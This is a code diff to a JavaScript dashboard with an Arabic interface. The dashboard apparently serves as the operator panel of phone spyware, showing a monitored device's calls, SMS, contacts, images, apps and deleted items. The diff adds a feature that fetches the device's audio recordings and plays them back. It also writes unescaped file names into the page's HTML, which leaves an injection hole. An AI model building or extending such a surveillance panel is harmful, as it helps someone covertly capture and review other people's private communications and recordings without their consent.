@@ -9,6 +9,7 @@ let allCalls = [];
 let allSMS = [];
 let allContacts = [];
 let allDeleted = [];
+let allAudio = [];
 let currentChat = null;
 let currentCallNumber = null;
 let currentContact = null;
@@ -204,6 +205,7 @@ async function updateLiveData() {
         if (data.sms_count !== undefined) document.getElementById('smsCount').textContent = `(${data.sms_count})`;
         if (data.contacts_count !== undefined) document.getElementById('contactsCount').textContent = `(${data.contacts_count})`;
         if (data.images_count !== undefined) document.getElementById('imagesCount').textContent = `(${data.images_count})`;
+        if (data.audio_count !== undefined) document.getElementById('audioCount').textContent = `(${data.audio_count})`;
         if (data.apps_count !== undefined) document.getElementById('appsCount').textContent = `(${data.apps_count})`;
         if (data.deleted_count !== undefined) document.getElementById('deletedCount').textContent = `(${data.deleted_count})`;
     } catch (e) {}
@@ -215,9 +217,47 @@ async function loadAllData() {
     await loadSMS();
     await loadContacts();
     await loadImages();
+    await loadAudio();
     await loadApps();
     await loadDeviceInfo();
     await loadDeleted();
+}
+
+async function loadAudio() {
+    try {
+        const response = await fetch(`/api.php?action=get_audio_data&device=${encodeURIComponent(currentDevice)}`);
+        const audioList = await response.json();
+        const div = document.getElementById('audioList');
+        if (!div) return;
+        
+        div.innerHTML = '';
+        
+        if (!audioList || audioList.length === 0) {
+            div.innerHTML = '<p style="color:#888;">لا توجد صوتيات</p>';
+            return;
+        }
+        
+        [...audioList].sort((a, b) => (b.date || 0) - (a.date || 0)).forEach(audio => {
+            const item = document.createElement('div');
+            item.className = 'conversation-item';
+            item.innerHTML = `
+                <div class="conversation-avatar">🎙️</div>
+                <div class="conversation-info">
+                    <div class="conversation-name">${audio.name || 'تسجيل'}</div>
+                    <div class="conversation-preview">${formatDate(audio.date)}</div>
+                </div>
+                <button onclick="playAudio('${audio.data}')" class="action-btn">▶️ تشغيل</button>
+            `;
+            div.appendChild(item);
+        });
+    } catch (e) {}
+}
+
+function playAudio(base64Data) {
+    try {
+        const audio = new Audio(`data:audio/3gp;base64,${base64Data}`);
+        audio.play();
+    } catch (e) {}
 }
 
 async function loadDeleted() {
